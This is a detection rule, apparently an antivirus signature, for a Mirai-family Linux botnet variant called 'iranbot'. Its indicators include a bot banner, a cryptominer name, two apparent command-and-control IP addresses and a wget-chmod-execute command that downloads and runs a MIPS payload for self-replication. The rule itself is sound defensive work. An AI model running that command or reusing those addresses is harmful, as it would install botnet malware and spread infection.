
rule Backdoor_Linux_Mirai_PA_MTB{
	meta:
		description = "Backdoor:Linux/Mirai.PA!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,06 00 06 00 05 00 00 "
		
	strings :
		$a_01_0 = {69 72 61 6e 62 6f 74 20 69 6e 69 74 3a 20 64 65 61 74 68 20 74 6f 20 69 73 72 61 65 6c } //4 iranbot init: death to israel
		$a_01_1 = {69 72 61 6e 62 6f 74 2e 78 6d 72 69 67 } //1 iranbot.xmrig
		$a_01_2 = {31 34 30 2e 32 33 33 2e 31 39 30 2e 38 32 } //1 140.233.190.82
		$a_01_3 = {38 32 2e 33 38 2e 34 2e 34 32 } //1 82.38.4.42
		$a_01_4 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 25 73 2f 69 72 61 6e 2e 6d 69 70 73 65 6c 3b 20 63 68 6d 6f 64 20 37 37 37 20 69 72 61 6e 2e 6d 69 70 73 65 6c 3b 20 2e 2f 69 72 61 6e 2e 6d 69 70 73 65 6c 20 73 65 6c 66 72 65 70 3b } //1 wget http://%s/iran.mipsel; chmod 777 iran.mipsel; ./iran.mipsel selfrep;
	condition:
		((#a_01_0  & 1)*4+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=6
 
}